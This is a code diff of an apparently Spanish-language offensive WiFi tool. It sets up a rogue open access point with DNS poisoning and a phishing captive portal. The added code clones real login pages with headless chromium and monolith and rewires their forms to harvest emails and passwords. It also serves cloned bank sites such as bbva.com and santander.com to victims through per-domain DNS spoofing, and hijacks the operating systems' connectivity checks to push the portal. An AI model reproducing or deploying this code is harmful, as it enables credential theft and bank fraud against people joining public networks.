@@ -27,7 +27,7 @@ Stack técnico:
   - WireTrapSniffer → captura HTTP/cookies/DNS del tráfico post-login
 
 Requisitos en Kali:
-  sudo apt install hostapd dnsmasq python3-flask python3-scapy
+  sudo apt install hostapd dnsmasq python3-flask python3-scapy monolith
   pip install requests beautifulsoup4
   (la interfaz debe estar en modo managed, NO en monitor)
 """
@@ -117,7 +117,7 @@ _PORTAL_HTML_GOOGLE = """<!DOCTYPE html>
   <h2>Iniciar sesión</h2>
   <p class="sub">para continuar en la red WiFi</p>
   <div class="info-bar">
-    🔒 Conexión gratuita a la red WiFi pública.
+    Conexión gratuita a la red WiFi pública.
     Se requiere autenticación para acceder a Internet.
   </div>
   <form method="POST" action="/login">
@@ -154,7 +154,7 @@ _PORTAL_HTML_SUCCESS = """<!DOCTYPE html>
 </head>
 <body>
 <div class="box">
-  <h2>✅ ¡Conectado!</h2>
+  <h2>Conectado!</h2>
   <p>Ahora tienes acceso a Internet.</p>
   <p>Redirigiendo a Google...</p>
 </div>
@@ -165,28 +165,144 @@ _PORTAL_HTML_SUCCESS = """<!DOCTYPE html>
 
 # ── Clonador de páginas de login ─────────────────────────────────
 
-def clone_login_page(url: str, log_fn=None) -> str:
+def _patch_form(html_text, _log):
+    """
+    Paso 1 (pre-monolith): adapta el formulario de login en el DOM de chromium.
+    NO elimina scripts ni <base> para que monolith pueda resolver recursos CSS/fuentes.
+    Devuelve (html_adaptado, form_encontrado).
+    """
+    try:
+        from bs4 import BeautifulSoup
+    except ImportError:
+        return html_text, False
+
+    soup = BeautifulSoup(html_text, "html.parser")
+
+    target_form = next(
+        (f for f in soup.find_all("form") if f.find("input", {"type": "password"})),
+        None
+    )
+    if target_form:
+        target_form["method"] = "POST"
+        target_form["action"] = "/login"
+        email_input = (
+            target_form.find("input", {"type": "email"}) or
+            target_form.find("input", {"type": "text"}) or
+            target_form.find("input", {"type": "tel"})
+        )
+        if email_input:
+            email_input["name"] = "email"
+        pwd = target_form.find("input", {"type": "password"})
+        if pwd:
+            pwd["name"] = "password"
+        _log("[+] Formulario adaptado → POST /login")
+        return str(soup), True
+    else:
+        return html_text, False
+
+
+def _adapt_form(html_text, _log):
+    """
+    Paso 2 (post-monolith o fallback): limpia scripts externos/<base> e inyecta
+    overlay si no hay form adaptado. Si _patch_form ya adaptó el form (action=/login),
+    lo detecta y no sobreescribe ni inyecta overlay.
+    """
+    try:
+        from bs4 import BeautifulSoup
+    except ImportError:
+        return html_text
+
+    soup = BeautifulSoup(html_text, "html.parser")
+
+    # Comprobar si el form ya fue adaptado por _patch_form (action="/login")
+    already_adapted = any(
+        f.get("action") in ("/login", "/login/") 
+        for f in soup.find_all("form")
+    )
+
+    if already_adapted:
+        # Form ya adaptado correctamente — solo limpiar
+        pass
+    else:
+        # Buscar form con password y adaptarlo
+        target_form = next(
+            (f for f in soup.find_all("form") if f.find("input", {"type": "password"})),
+            None
+        )
+        if target_form:
+            target_form["method"] = "POST"
+            target_form["action"] = "/login"
+            email_input = (
+                target_form.find("input", {"type": "email"}) or
+                target_form.find("input", {"type": "text"}) or
+                target_form.find("input", {"type": "tel"})
+            )
+            if email_input:
+                email_input["name"] = "email"
+            pwd = target_form.find("input", {"type": "password"})
+            if pwd:
+                pwd["name"] = "password"
+            _log("[+] Formulario adaptado → POST /login")
+        else:
+            _log("[!] Sin form con password: inyectando overlay")
+            overlay = (
+                '<div id="wt-overlay" style="position:fixed;top:0;left:0;width:100%;height:100%;'
+                'background:rgba(0,0,0,0.72);z-index:99999;display:flex;align-items:center;'
+                'justify-content:center;font-family:sans-serif;">'
+                '<div style="background:#fff;border-radius:10px;padding:40px 36px;width:340px;'
+                'text-align:center;box-shadow:0 8px 32px rgba(0,0,0,0.4);">'
+                '<h2 style="margin:0 0 6px;font-size:22px;color:#202124;font-weight:500;">'
+                'Inicia sesion para continuar</h2>'
+                '<p style="margin:0 0 24px;font-size:13px;color:#5f6368;">'
+                'Necesitas identificarte para acceder a internet</p>'
+                '<form method="POST" action="/login">'
+                '<input name="email" type="email" placeholder="Correo electronico" required '
+                'style="display:block;width:100%;padding:11px 12px;margin-bottom:12px;'
+                'border:1px solid #dadce0;border-radius:4px;font-size:14px;box-sizing:border-box">'
+                '<input name="password" type="password" placeholder="Contrasena" required '
+                'style="display:block;width:100%;padding:11px 12px;margin-bottom:20px;'
+                'border:1px solid #dadce0;border-radius:4px;font-size:14px;box-sizing:border-box">'
+                '<button type="submit" '
+                'style="width:100%;background:#1a73e8;color:#fff;border:none;border-radius:4px;'
+                'padding:11px;font-size:15px;font-weight:500;cursor:pointer;">'
+                'Acceder</button>'
+                '</form>'
+                '</div>'
+                '</div>'
+            )
+            body = soup.find("body")
+            if body:
+                body.insert(0, BeautifulSoup(overlay, "html.parser"))
+
+    for tag in soup.find_all("script", src=True):
+        tag.decompose()
+    for tag in soup.find_all("base"):
+        tag.decompose()
+
+    _log("[+] Clonacion completada")
+    return str(soup)
+
+
+def clone_login_page(url, log_fn=None):
     """
     Descarga la página de login indicada por 'url' y devuelve un HTML
-    autocontenido con todos los recursos (CSS, imágenes, fuentes, JS)
-    incrustados como data-URI en base64.
+    autocontenido con todos los recursos (CSS, imágenes, fuentes) incrustados
+    como data-URI en base64.
 
-    Estrategia de descarga (en orden, hasta que una funcione):
-      1. requests con headers de navegador real + cookies de sesión
-      2. Playwright headless (si está disponible) — para sitios con JS pesado
-         que bloquean scrapers simples (McDonald's, Google, etc.)
-
-    El HTML resultante se modifica para que:
-      - El primer <form> con campos de password apunte a POST /login
-      - Los campos del form se renombren a "email" y "password"
-        (para que Flask los capture igual que en la plantilla Google)
+    Estrategia (en orden de preferencia):
+      1. chromium --dump-dom | monolith
+         monolith inlina TODO: CSS, fuentes (@font-face), imágenes como data-URI.
+         Resuelve el problema de fuentes incorrectas y CSS bloqueados (403).
+         Instalacion: sudo apt install monolith
+      2. Fallback: chromium --dump-dom + inlining manual con requests
+         Funciona para sitios que no bloquean recursos.
+      3. Fallback final: requests directo (sin JS rendering)
 
     Args:
-        url: URL de una página de login real
-        log_fn: función opcional para recibir mensajes de progreso
-
+        url:    URL de la página de login real
+        log_fn: función opcional para mensajes de progreso
     Returns:
-        str con el HTML autocontenido, o "" si falla
+        str con HTML autocontenido, o "" si falla
     """
     def _log(msg):
         if log_fn:
@@ -196,256 +312,268 @@ def clone_login_page(url: str, log_fn=None) -> str:
         import requests
         from bs4 import BeautifulSoup
     except ImportError:
-        _log("[!] Faltan dependencias: pip3 install requests beautifulsoup4 --break-system-packages")
+        _log("[!] pip3 install requests beautifulsoup4 --break-system-packages")
         return ""
 
-    import re as _re
+    import re
+    import shutil
+    import subprocess
+    from urllib.parse import urljoin, urlparse
 
-    headers = {
+    import urllib3
+    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+    HEADERS = {
         "User-Agent": (
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
             "AppleWebKit/537.36 (KHTML, like Gecko) "
             "Chrome/124.0.0.0 Safari/537.36"
         ),
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-        "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": "es-ES,es;q=0.9,en;q=0.7",
         "Accept-Encoding": "gzip, deflate, br",
         "Connection": "keep-alive",
         "Upgrade-Insecure-Requests": "1",
-        "Sec-Fetch-Dest": "document",
-        "Sec-Fetch-Mode": "navigate",
-        "Sec-Fetch-Site": "none",
-        "Sec-Fetch-User": "?1",
-        "Cache-Control": "max-age=0",
     }
 
-    import urllib3
-    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+    chromium_bin = (shutil.which("chromium") or
+                    shutil.which("chromium-browser") or
+                    shutil.which("google-chrome") or
+                    shutil.which("google-chrome-stable"))
+    monolith_bin = shutil.which("monolith")
 
+    _log("[*] Iniciando clonacion de: " + url)
+
+    # ── 1. Pipeline optimo: chromium --dump-dom | monolith ──────────────────────
+    # monolith descarga y embebe TODOS los recursos (CSS, fuentes, imagenes)
+    # como data-URI base64. Produce HTML 100% autocontenido visualmente identico.
+    if chromium_bin and monolith_bin:
+        _log("[*] Usando pipeline: chromium --dump-dom | monolith")
+        try:
+            dump_result = subprocess.run(
+                [
+                    chromium_bin,
+                    "--headless=new",
+                    "--no-sandbox",
+                    "--disable-setuid-sandbox",
+                    "--disable-gpu",
+                    "--disable-dev-shm-usage",
+                    "--disable-blink-features=AutomationControlled",
+                    "--user-agent=" + HEADERS["User-Agent"],
+                    "--timeout=20000",
+                    "--dump-dom",
+                    url,
+                ],
+                capture_output=True,
+                text=True,
+                timeout=35,
+            )
+
+            if dump_result.returncode == 0 and len(dump_result.stdout) > 500:
+                _log("[*] Chromium dump-dom OK (" + str(len(dump_result.stdout)) + " bytes)")
+
+                # Estrategia: monolith procesa el HTML original para incrustar
+                # CSS/fuentes como data-URI. Pero monolith destruye <form>/<input>
+                # al re-serializar el DOM. Solución: extraemos los <style> y <link>
+                # incrustados que genera monolith y los inyectamos en el HTML
+                # original (que sí conserva el form intacto).
+                mono_result = subprocess.run(
+                    [
+                        monolith_bin,
+                        "-",
+                        "-I",
+                        "-b", url,
+                        "--insecure",
+                    ],
+                    input=dump_result.stdout,
+                    capture_output=True,
+                    text=True,
+                    timeout=120,
+                )
+
+                if mono_result.returncode == 0 and len(mono_result.stdout) > 1000:
+                    _log("[+] monolith OK (" + str(len(mono_result.stdout)) + " bytes) — extrayendo CSS embebido")
+
+                    # Extraer estilos incrustados de monolith (data-URI base64)
+                    try:
+                        from bs4 import BeautifulSoup as BS
+                        soup_mono = BS(mono_result.stdout, "html.parser")
+                        # Recoger todos los <style> con data-URI (fuentes/CSS embebidos)
+                        embedded_styles = []
+                        for tag in soup_mono.find_all("style"):
+                            if tag.string and ("data:" in tag.string or len(tag.string) > 500):
+                                embedded_styles.append(str(tag))
+                        # Recoger <link rel=stylesheet> con data-URI href
+                        for tag in soup_mono.find_all("link", rel=lambda r: r and "stylesheet" in r):
+                            href = tag.get("href", "")
+                            if href.startswith("data:"):
+                                embedded_styles.append(str(tag))
+
+                        # Inyectar estilos embebidos en el HTML original (con form)
+                        soup_orig = BS(dump_result.stdout, "html.parser")
+                        head = soup_orig.find("head")
+                        if head and embedded_styles:
+                            injection = BS("".join(embedded_styles), "html.parser")
+                            head.append(injection)
+                            _log("[+] " + str(len(embedded_styles)) + " bloques CSS/fuentes inyectados en HTML original")
+                        
+                        combined_html = str(soup_orig)
+                    except Exception as e:
+                        _log("[!] Error extrayendo CSS de monolith: " + str(e))
+                        combined_html = dump_result.stdout
+
+                    return _adapt_form(combined_html, _log)
+                else:
+                    stderr_preview = mono_result.stderr[:200] if mono_result.stderr else "sin output"
+                    _log("[!] monolith fallo (rc=" + str(mono_result.returncode) + "): " + stderr_preview)
+            else:
+                _log("[!] Chromium devolvio poco contenido (" + str(len(dump_result.stdout)) + " bytes)")
+        except subprocess.TimeoutExpired:
+            _log("[!] Pipeline chromium|monolith tardó demasiado, usando fallback")
+        except Exception as e:
+            _log("[!] Pipeline chromium|monolith error: " + str(e))
+
+    elif not monolith_bin:
+        _log("[!] monolith no encontrado — instala: sudo apt install monolith")
+        _log("[!] Usando fallback manual (fuentes externas pueden no cargarse)")
+
+    # ── 2. Fallback: chromium --dump-dom + inlining manual ──────────────────────
     html_text = ""
-    final_url = url
+    final_url  = url
 
-    # ── 1. Intentar con requests ─────────────────────────────────
-    _log(f"[*] Iniciando clonación de: {url}")
-    try:
-        session = requests.Session()
-        session.headers.update(headers)
-        session.verify = False
-        # Primero visitar la home del dominio para obtener cookies de sesión
-        parsed = urlparse(url)
-        home_url = f"{parsed.scheme}://{parsed.netloc}/"
+    if chromium_bin:
+        _log("[*] Usando " + chromium_bin + " --headless --dump-dom")
         try:
-            session.get(home_url, timeout=10, allow_redirects=True)
-        except Exception:
-            pass
-        # Ahora descargar la página de login con las cookies
-        _log(f"[*] Descargando página: {url}")
-        resp = session.get(url, timeout=20, allow_redirects=True)
-        resp.raise_for_status()
-        final_url = resp.url
-        encoding = resp.encoding or "utf-8"
-        try:
-            html_text = resp.content.decode(encoding, errors="replace")
-        except Exception:
-            html_text = resp.text
-        _log(f"[*] Descargado con requests ({len(html_text)} bytes). URL final: {final_url}")
-    except Exception as e:
-        _log(f"[!] requests falló: {e}")
-        html_text = ""
+            result = subprocess.run(
+                [
+                    chromium_bin,
+                    "--headless=new",
+                    "--no-sandbox",
+                    "--disable-setuid-sandbox",
+                    "--disable-gpu",
+                    "--disable-dev-shm-usage",
+                    "--disable-blink-features=AutomationControlled",
+                    "--user-agent=" + HEADERS["User-Agent"],
+                    "--timeout=20000",
+                    "--dump-dom",
+                    url,
+                ],
+                capture_output=True,
+                text=True,
+                timeout=30,
+            )
+            if result.returncode == 0 and len(result.stdout) > 500:
+                html_text = result.stdout
+                final_url = url
+                _log("[*] Chromium dump-dom OK (" + str(len(html_text)) + " bytes)")
+            else:
+                _log("[!] Chromium devolvio poco contenido, usando requests")
+        except subprocess.TimeoutExpired:
+            _log("[!] Chromium tardó demasiado, usando requests")
+        except Exception as e:
+            _log("[!] Chromium fallo: " + str(e))
 
-    # ── 2. Fallback: Playwright headless ─────────────────────────
+    # ── 3. Fallback final: requests con cookies de sesion ───────────────────────
     if not html_text or len(html_text) < 500:
-        _log("[*] Intentando con Playwright headless (puede tardar ~10s)...")
+        _log("[*] Descargando con requests: " + url)
         try:
-            from playwright.sync_api import sync_playwright
-            with sync_playwright() as pw:
-                browser = pw.chromium.launch(
-                    headless=True,
-                    args=["--no-sandbox", "--disable-setuid-sandbox",
-                          "--disable-blink-features=AutomationControlled"]
-                )
-                ctx = browser.new_context(
-                    user_agent=headers["User-Agent"],
-                    locale="es-ES",
-                    viewport={"width": 1280, "height": 800},
-                    ignore_https_errors=True,
-                )
-                page = ctx.new_page()
-                page.goto(url, wait_until="networkidle", timeout=30000)
-                final_url = page.url
-                html_text = page.content()
-                browser.close()
-            _log(f"[*] Playwright OK ({len(html_text)} bytes). URL final: {final_url}")
-        except ImportError:
-            _log("[!] Playwright no disponible. Instala: pip3 install playwright --break-system-packages && playwright install chromium")
-            if not html_text:
-                return ""
-        except Exception as e2:
-            _log(f"[!] Playwright también falló: {e2}")
-            if not html_text:
-                return ""
+            sess = requests.Session()
+            sess.headers.update(HEADERS)
+            sess.verify = False
+            parsed = urlparse(url)
+            home = parsed.scheme + "://" + parsed.netloc + "/"
+            try:
+                sess.get(home, timeout=10, allow_redirects=True)
+            except Exception:
+                pass
+            resp = sess.get(url, timeout=20, allow_redirects=True)
+            resp.raise_for_status()
+            final_url = resp.url
+            html_text = resp.content.decode(resp.encoding or "utf-8", errors="replace")
+            _log("[*] requests OK (" + str(len(html_text)) + " bytes). URL final: " + final_url)
+        except Exception as e:
+            _log("[!] requests fallo: " + str(e))
+            return ""
 
     soup = BeautifulSoup(html_text, "html.parser")
 
-    # Sesión requests para descargar recursos (siempre disponible,
-    # incluso si el HTML lo obtuvo Playwright)
-    _res_session = requests.Session()
-    _res_session.headers.update(headers)
-    _res_session.verify = False
+    res_sess = requests.Session()
+    res_sess.headers.update(HEADERS)
+    res_sess.verify = False
 
-    # ── 2. Función auxiliar: descargar recurso → data URI ────────
-    def _resource_to_data_uri(href, base_url):
-        abs_url = urljoin(base_url, href)
-        # Sólo recursos HTTP/HTTPS
-        scheme = urlparse(abs_url).scheme
-        if scheme not in ("http", "https"):
+    def to_data_uri(href, base):
+        abs_url = urljoin(base, href)
+        if urlparse(abs_url).scheme not in ("http", "https"):
             return None
         try:
-            r = _res_session.get(abs_url, timeout=10, allow_redirects=True)
+            r = res_sess.get(abs_url, timeout=10, allow_redirects=True)
             if r.status_code != 200:
                 return None
-            content_type = r.headers.get("Content-Type", "").split(";")[0].strip()
-            if not content_type:
-                # Adivinar por extensión
+            ct = r.headers.get("Content-Type", "").split(";")[0].strip()
+            if not ct:
                 ext = os.path.splitext(urlparse(abs_url).path)[1].lower()
-                content_type = mimetypes.types_map.get(ext, "application/octet-stream")
-            b64 = base64.b64encode(r.content).decode("ascii")
-            return f"data:{content_type};base64,{b64}"
+                ct = mimetypes.types_map.get(ext, "application/octet-stream")
+            return "data:" + ct + ";base64," + base64.b64encode(r.content).decode()
         except Exception:
             return None
 
-    # ── 3. Inlinar CSS externos ──────────────────────────────────
+    def inline_css_urls(css_text, base):
+        def _repl(m):
+            raw = m.group(1).strip(" '\"")
+            if raw.startswith("data:"):
+                return m.group(0)
+            d = to_data_uri(raw, base)
+            return "url(" + d + ")" if d else m.group(0)
+        return re.sub(r"url\(([^)]+)\)", _repl, css_text)
+
     for tag in soup.find_all("link", rel=lambda v: v and "stylesheet" in v):
         href = tag.get("href", "")
         if not href or href.startswith("data:"):
             continue
-        _log(f"  [css] {href[:80]}")
-        data_uri = _resource_to_data_uri(href, final_url)
-        if data_uri:
-            new_style = soup.new_tag("style")
-            # Descargar el CSS y resolver sus url() también
-            try:
-                abs_url = urljoin(final_url, href)
-                css_resp = _res_session.get(abs_url, timeout=10)
-                css_text = css_resp.text
-                # Reemplazar url(...) dentro del CSS con data URIs
-                import re as _re
-                def _replace_css_url(m):
-                    raw = m.group(1).strip("'\" ")
-                    if raw.startswith("data:"):
-                        return m.group(0)
-                    d = _resource_to_data_uri(raw, abs_url)
-                    return f"url({d})" if d else m.group(0)
-                css_text = _re.sub(r"url\(([^)]+)\)", _replace_css_url, css_text)
-                new_style.string = css_text
-            except Exception:
-                new_style.string = f"/* could not inline {href} */"
-            tag.replace_with(new_style)
+        _log("  [css] " + href[:80])
+        abs_url = urljoin(final_url, href)
+        try:
+            r = res_sess.get(abs_url, timeout=10)
+            if r.status_code == 200:
+                css = inline_css_urls(r.text, abs_url)
+                style = soup.new_tag("style")
+                style.string = css
+                tag.replace_with(style)
+            else:
+                _log("  [!] CSS " + str(r.status_code) + ": " + href[:60])
+                tag.decompose()
+        except Exception as e:
+            _log("  [!] CSS error: " + str(e))
+            tag.decompose()
 
-    # ── 4. Inlinar imágenes (<img src=>) ─────────────────────────
     for tag in soup.find_all("img"):
         src = tag.get("src", "")
-        if not src or src.startswith("data:"):
-            continue
-        _log(f"  [img] {src[:80]}")
-        data_uri = _resource_to_data_uri(src, final_url)
-        if data_uri:
-            tag["src"] = data_uri
+        if src and not src.startswith("data:"):
+            d = to_data_uri(src, final_url)
+            if d:
+                tag["src"] = d
 
-    # ── 5. Inlinar fuentes y otros recursos en <style> inline ────
-    import re as _re
-    for style_tag in soup.find_all("style"):
-        if style_tag.string:
-            def _replace_css_url2(m):
-                raw = m.group(1).strip("'\" ")
-                if raw.startswith("data:"):
-                    return m.group(0)
-                d = _resource_to_data_uri(raw, final_url)
-                return f"url({d})" if d else m.group(0)
-            style_tag.string = _re.sub(r"url\(([^)]+)\)", _replace_css_url2, style_tag.string)
-
-    # ── 6. Inlinar atributos background/style inline ─────────────
+    for tag in soup.find_all("style"):
+        if tag.string:
+            tag.string = inline_css_urls(tag.string, final_url)
     for tag in soup.find_all(style=True):
-        style_val = tag["style"]
-        def _replace_inline(m):
-            raw = m.group(1).strip("'\" ")
-            if raw.startswith("data:"):
-                return m.group(0)
-            d = _resource_to_data_uri(raw, final_url)
-            return f"url({d})" if d else m.group(0)
-        tag["style"] = _re.sub(r"url\(([^)]+)\)", _replace_inline, style_val)
+        tag["style"] = inline_css_urls(tag["style"], final_url)
 
-    # ── 7. Adaptar el formulario para capturar credenciales ───────
-    # Buscar el form que tenga input[type=password]
-    target_form = None
-    for form in soup.find_all("form"):
-        if form.find("input", {"type": "password"}):
-            target_form = form
-            break
+    return _adapt_form(str(soup), _log)
 
-    if target_form:
-        target_form["method"] = "POST"
-        target_form["action"] = "/login"
-        # Renombrar el primer campo de texto/email → "email"
-        email_input = (target_form.find("input", {"type": "email"})
-                       or target_form.find("input", {"type": "text"})
-                       or target_form.find("input", {"type": "tel"}))
-        if email_input:
-            email_input["name"] = "email"
-        # Renombrar el campo password → "password"
-        pwd_input = target_form.find("input", {"type": "password"})
-        if pwd_input:
-            pwd_input["name"] = "password"
-        _log("[+] Formulario adaptado → POST /login (email, password)")
-    else:
-        # No encontró form con password: inyectar uno encima del body
-        _log("[!] No se encontró form con password; inyectando overlay de login")
-        overlay_html = """
-<div id="wt-overlay" style="position:fixed;top:0;left:0;width:100%;height:100%;
-  background:rgba(0,0,0,0.7);z-index:99999;display:flex;align-items:center;
-  justify-content:center;">
-  <div style="background:white;border-radius:8px;padding:40px;width:340px;text-align:center;
-    box-shadow:0 4px 24px rgba(0,0,0,0.5);">
-    <h2 style="margin-bottom:16px;font-size:20px;color:#333;">Inicia sesión para continuar</h2>
-    <form method="POST" action="/login">
-      <input name="email" type="email" placeholder="Correo electrónico" required
-        style="width:100%;padding:10px;margin-bottom:12px;border:1px solid #ccc;
-               border-radius:4px;font-size:14px;">
-      <input name="password" type="password" placeholder="Contraseña" required
-        style="width:100%;padding:10px;margin-bottom:16px;border:1px solid #ccc;
-               border-radius:4px;font-size:14px;">
-      <button type="submit"
-        style="width:100%;background:#1a73e8;color:white;border:none;border-radius:4px;
-               padding:11px;font-size:15px;cursor:pointer;">Acceder</button>
-    </form>
-  </div>
-</div>"""
-        body = soup.find("body")
-        if body:
-            body.insert(0, BeautifulSoup(overlay_html, "html.parser"))
-
-    # ── 8. Eliminar scripts externos (pueden romper el portal) ────
-    for tag in soup.find_all("script", src=True):
-        tag.decompose()
-
-    # ── 9. Quitar <base> tags que redirigirían recursos externos ──
-    for tag in soup.find_all("base"):
-        tag.decompose()
-
-    _log("[+] Clonación completada")
-    return str(soup)
-
-
-# ── Flask app ────────────────────────────────────────────────────
 
 def _build_flask_app(gateway_ip, template_type, creds_log,
                      custom_html=None,
-                     on_credential=None, on_client_login=None):
+                     on_credential=None, on_client_login=None,
+                     dns_spoof_domains=None):
     """
     Construye la app Flask del portal.
 
-    template_type: "google" | "custom"
-    custom_html:   HTML clonado (solo cuando template_type == "custom")
+    template_type:     "google" | "custom"
+    custom_html:       HTML clonado (solo cuando template_type == "custom")
+    dns_spoof_domains: lista de dicts [{"domain": "bbva.com", "clone_url": "...", "html": "..."}]
+                       Si entry["html"] está relleno, Flask sirve esa copia cuando el Host
+                       del request coincide con ese dominio.
 
     Incluye rutas de detección para cada SO:
       - iOS/macOS: /hotspot-detect.html, /library/test/success.html
@@ -466,14 +594,44 @@ def _build_flask_app(gateway_ip, template_type, creds_log,
     else:
         portal_html = _PORTAL_HTML_GOOGLE
 
-    portal_url = f"http://{gateway_ip}/"
+    portal_url = "http://" + gateway_ip + "/"
 
-    # ── Rutas de detección OS (OS Captive Portal Probes) ──────────
+    # Mapa dominio → HTML clonado para DNS Spoofing
+    # {"bbva.com": "<html>...", "santander.com": "<html>..."}
+    _spoof_html_map = {}
+    if dns_spoof_domains:
+        for entry in dns_spoof_domains:
+            if not isinstance(entry, dict):
+                continue
+            d = entry.get("domain", "").strip().lower()
+            h = entry.get("html", "")
+            if d and h:
+                _spoof_html_map[d] = h
+
+    def _get_spoof_html_for_request():
+        """
+        Devuelve el HTML clonado si el Host header coincide con algún dominio
+        del mapa de spoofing. Devuelve None si no hay coincidencia.
+        """
+        if not _spoof_html_map:
+            return None
+        host = request.headers.get("Host", "").lower().split(":")[0]  # quitar puerto
+        # Coincidencia exacta
+        if host in _spoof_html_map:
+            return _spoof_html_map[host]
+        # Coincidencia sin "www."
+        host_no_www = host[4:] if host.startswith("www.") else host
+        if host_no_www in _spoof_html_map:
+            return _spoof_html_map[host_no_www]
+        # El dominio guardado puede tener www. y el request no
+        if "www." + host in _spoof_html_map:
+            return _spoof_html_map["www." + host]
+        return None
+
     @app.route("/hotspot-detect.html")
     @app.route("/library/test/success.html")
     @app.route("/hotspot-detect")
     def apple_probe():
-        """iOS/macOS espera '<html><body>Success</body></html>'."""
         return redirect(portal_url, 302)
 
     @app.route("/generate_204")
@@ -482,21 +640,16 @@ def _build_flask_app(gateway_ip, template_type, creds_log,
     @app.route("/connectivitycheck")
     @app.route("/connectivitycheck.html")
     def android_probe():
-        """Android espera HTTP 204 vacío."""
         return redirect(portal_url, 302)
 
     @app.route("/connecttest.txt")
     @app.route("/ncsi.txt")
     def windows_probe():
-        """Windows 10 espera 'Microsoft Connect Test'; NCSI legacy 'Microsoft NCSI'."""
         return redirect(portal_url, 302)
 
     @app.route("/canonical.html")
     def firefox_probe():
-        """Firefox Network Connectivity Check."""
         return redirect(portal_url, 302)
-
-    # ── Portal principal ──────────────────────────────────────────
 
     @app.route("/login", methods=["POST"])
     def login():
@@ -504,7 +657,9 @@ def _build_flask_app(gateway_ip, template_type, creds_log,
         password = request.form.get("password", "").strip()
         ip       = request.remote_addr
         ts       = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        entry    = {"timestamp": ts, "ip": ip, "email": email, "password": password}
+        # Incluir el dominio spoofado si aplica (para saber de qué web vinieron las creds)
+        host     = request.headers.get("Host", "").lower().split(":")[0]
+        entry    = {"timestamp": ts, "ip": ip, "email": email, "password": password, "host": host}
         creds_log.append(entry)
         if on_credential:
             on_credential(entry)
@@ -519,6 +674,11 @@ def _build_flask_app(gateway_ip, template_type, creds_log,
     @app.route("/", defaults={"path": ""})
     @app.route("/<path:path>")
     def catch_all(path):
+        # Si el Host coincide con un dominio spoofado y tenemos su clon → servirlo
+        spoof_html = _get_spoof_html_for_request()
+        if spoof_html:
+            return make_response(spoof_html, 200)
+        # Si no → portal cautivo normal
         return make_response(portal_html, 200)
 
     return app
@@ -529,17 +689,9 @@ def _build_flask_app(gateway_ip, template_type, creds_log,
 class CaptivePortal:
     """
     Levanta un AP abierto + DHCP + DNS poisoning + portal de phishing.
-
-    Flujo:
-      1. Víctima se conecta → OS detecta portal via probes HTTP → popup
-      2. Víctima hace submit → credenciales capturadas
-      3. Se activa NAT para su IP → tiene internet real
-         (DNS fix: su UDP/TCP 53 se redirige a 8.8.8.8 para que
-          los nombres resuelvan aunque dnsmasq siga envenenando)
-      4. WireTrapSniffer captura cookies/HTTP mientras navega
     """
 
-    def __init__(self, interface: str):
+    def __init__(self, interface):
         self.interface     = interface
         self.out_interface = "eth0"
         self.running       = False
@@ -547,15 +699,16 @@ class CaptivePortal:
         self.ssid          = "FreeWiFi"
         self.channel       = 6
         self.template_type = "google"
-        self.custom_html   = ""       # HTML clonado (usado si template_type=="custom")
+        self.custom_html   = ""
 
         self.captured_creds  = []
         self._logged_in_ips  = set()
 
         # DNS Spoofing por dominio específico
-        # Lista de dominios a falsificar (ej: ["banco.es", "google.com"])
+        # Lista de dicts: [{"domain": "bbva.com", "clone_url": "https://bbva.com/login", "html": "..."}]
+        # Si clone_url está vacío, redirige al captive portal normal.
+        # Si html está relleno (clonado al arrancar), Flask sirve esa copia.
         self.dns_spoof_domains   = []
-        # IP a la que resolver los dominios espoofeados (por defecto el portal)
         self.dns_spoof_target_ip = GATEWAY_IP
 
         self._hostapd_conf = "/tmp/wt_cp_hostapd.conf"
@@ -567,15 +720,12 @@ class CaptivePortal:
         self._flask_thread = None
         self._sniffer      = None
 
-        # Callbacks GUI
         self.on_started    = None
         self.on_stopped    = None
         self.on_error      = None
         self.on_credential = None
         self.on_sniff_data = None
         self.on_log        = None
-
-    # ── Utilidades ───────────────────────────────────────────────
 
     def _log(self, msg):
         if self.on_log:
@@ -589,110 +739,76 @@ class CaptivePortal:
     def _hw_mode(channel):
         return "a" if channel >= 36 else "g"
 
-    # ── Clonación de plantilla personalizada ─────────────────────
-
-    def clone_template(self, url: str) -> bool:
+    def clone_template(self, url):
         """
         Clona la página de login en 'url' y la guarda en self.custom_html.
         Retorna True si tuvo éxito, False si falló.
-        Puede llamarse desde la GUI antes de start().
         """
-        self._log(f"[*] Iniciando clonación de: {url}")
+        self._log("[*] Iniciando clonacion de: " + url)
         html = clone_login_page(url, log_fn=self._log)
         if html:
             self.custom_html = html
             self.template_type = "custom"
-            self._log(f"[+] Plantilla clonada OK ({len(html)} bytes)")
+            self._log("[+] Plantilla clonada OK (" + str(len(html)) + " bytes)")
             return True
         else:
             self._err("No se pudo clonar la plantilla.")
             return False
 
-    # ── Configuraciones ──────────────────────────────────────────
-
     def _write_hostapd_conf(self):
         hw = self._hw_mode(self.channel)
-        conf = (f"interface={self.interface}\ndriver=nl80211\nssid={self.ssid}\n"
-                f"hw_mode={hw}\nchannel={self.channel}\nauth_algs=1\nwpa=0\n"
-                f"ignore_broadcast_ssid=0\nieee80211n=1\nwmm_enabled=1\n")
+        conf = ("interface=" + self.interface + "\ndriver=nl80211\nssid=" + self.ssid + "\n"
+                "hw_mode=" + hw + "\nchannel=" + str(self.channel) + "\nauth_algs=1\nwpa=0\n"
+                "ignore_broadcast_ssid=0\nieee80211n=1\nwmm_enabled=1\n")
         open(self._hostapd_conf, "w").write(conf)
-        self._log(f"hostapd.conf → {self._hostapd_conf}")
+        self._log("hostapd.conf → " + self._hostapd_conf)
 
     def _write_dnsmasq_conf(self):
-        """
-        Genera la config de dnsmasq con:
-          - DNS poisoning: address=/#/GATEWAY_IP  (todo dominio → portal)
-          - DHCP option 114: anuncia la URL del portal cautivo directamente
-            en el DHCP. iOS 14+ abre el popup sin necesidad de HTTP probe.
-          - local-ttl=0: los clientes no cachean la detección del portal,
-            así el popup aparece siempre aunque el móvil ya se haya conectado
-            antes a esta red.
-          - Lease corta (5m): fuerza re-negociación rápida para re-detección.
-        """
-        # Modo sin DNS Spoofing: envenenar todo (address=/#/) y no hay servidor real.
-        # Modo con DNS Spoofing: dnsmasq actúa como proxy DNS real (server=upstream)
